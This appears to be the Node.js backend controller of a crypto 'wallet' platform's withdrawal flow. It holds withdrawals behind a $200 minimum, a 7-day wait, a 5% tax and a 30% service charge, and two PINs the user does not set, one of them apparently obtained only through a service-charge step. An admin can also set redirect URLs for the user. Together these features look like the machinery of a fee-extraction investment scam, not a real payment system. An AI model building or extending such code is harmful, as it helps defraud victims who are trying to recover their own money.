// backend/controllers/withdrawController.js

const User     = require('../models/User');
const Withdraw = require('../models/Withdraw');
const Pin      = require('../models/Pin');
const Message  = require('../models/Message');
const mailer   = require('../utils/mailer');

/**
 * POST /api/withdraw
 * User requests a withdrawal
 */
exports.requestWithdraw = async (req, res) => {
  try {
    const { amount, crypto, address } = req.body;
    const user = await User.findById(req.user.id);

    // Enforce minimum balance
    if (user.walletBalance < 200) {
      return res.status(400).json({ msg: 'Minimum balance of $200 required to withdraw' });
    }

    // Enforce 7-day wait period
    const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
    if (user.createdAt > sevenDaysAgo) {
      return res.status(400).json({ msg: 'You must be registered for at least 7 days to withdraw' });
    }

    if (amount > user.walletBalance) {
      return res.status(400).json({ msg: 'Insufficient balance' });
    }

    // Proceed as before...
    const taxAmount = +(amount * 0.05).toFixed(2);
    const serviceAmount = +(amount * 0.3).toFixed(2);

    await Withdraw.create({
      user: req.user.id,
      amount,
      crypto,
      address,
      taxAmount,
      serviceAmount
    });

    await Message.create({
      fromUser: null,
      toUser:   req.user.id,
      text:     `withdrawRequested:${amount}`
    });

    mailer.sendEmail({
      to: process.env.ADMIN_EMAIL,
      subject: 'Withdrawal Requested',
      text: `User ${user.email} requested $${amount}. Balance: $${user.walletBalance}.`
    });

    res.json({ msg: 'Withdrawal requested' });
  } catch (err) {
    console.error('requestWithdraw error:', err);
    res.status(500).json({ msg: 'Server error requesting withdrawal' });
  }
};

/**
 * GET /api/withdraw/verify
 * Provide details for the 4-digit PIN step
 */
exports.getVerify = async (req, res) => {
  const w = await Withdraw.findOne({ user: req.user.id }).sort('-createdAt');
  if (!w) return res.status(404).json({ msg: 'No withdrawal found' });
  const user = await User.findById(req.user.id);
  res.json({
    amount:  w.amount,
    crypto:  w.crypto,
    address: w.address,
    balance: user.walletBalance
  });
};

/**
 * POST /api/withdraw/verify
 * Validate the 4-digit PIN and decide next step
 */
exports.postVerify = async (req, res) => {
  const { pin } = req.body;
  const userId = req.user.id;

  const pinRecord = await Pin.findOne({ user: userId });
  if (!pinRecord || pinRecord.verifyPin !== pin) {
    return res.status(400).json({ msg: 'Invalid PIN' });
  }

  // If admin has set at least one URL, go to confirm-URL step
  if (pinRecord.withdrawURLs && pinRecord.withdrawURLs.length > 0) {
    return res.json({ next: 'confirm' });
  }
  // Otherwise proceed to service-charge
  return res.json({ next: 'service' });
};

/**
 * GET /api/withdraw/service
 * Provide details for the service-charge step
 */
exports.getService = async (req, res) => {
  const w = await Withdraw.findOne({ user: req.user.id }).sort('-createdAt');
  if (!w) return res.status(404).json({ msg: 'No withdrawal found' });
  res.json({ amount: w.amount, serviceAmount: w.serviceAmount });
};

/**
 * POST /api/withdraw/service
 * Validate the 5-digit PIN and finalize withdrawal
 */
exports.postService = async (req, res) => {
  const { pin } = req.body;
  const userId  = req.user.id;
  const pinRecord = await Pin.findOne({ user: userId });
  if (!pinRecord || pinRecord.servicePin !== pin) {
    return res.status(400).json({ msg: 'Invalid service PIN' });
  }

  const w = await Withdraw.findOneAndDelete({ user: userId }).sort('-createdAt');
  const user = await User.findById(userId);
  user.walletBalance -= w.amount;
  await user.save();

  await Message.create({
    fromUser: null,
    toUser:   userId,
    text:     `withdrawCompleted:${w.amount}`
  });

  mailer.sendEmail({
    to: user.email,
    subject: 'Withdrawal Completed',
    text: `Your withdrawal of $${w.amount} has been processed.`
  });

  res.json({ success: true });
};

/**
 * GET /api/withdraw/confirm
 * Return the first approved URL for final redirect
 */
exports.confirmWithdrawURL = async (req, res) => {
  try {
    const pinRecord = await Pin.findOne({ user: req.user.id });
    const rawUrl = pinRecord?.withdrawURLs?.[0];
    if (!rawUrl) return res.status(404).json({ msg: 'No approved URL' });

    const url = /^https?:\/\//i.test(rawUrl) ? rawUrl : `https://${rawUrl}`;
    return res.json({ url });
  } catch (err) {
    console.error('confirmWithdrawURL error:', err);
    return res.status(500).json({ msg: 'Server error fetching URL' });
  }
};
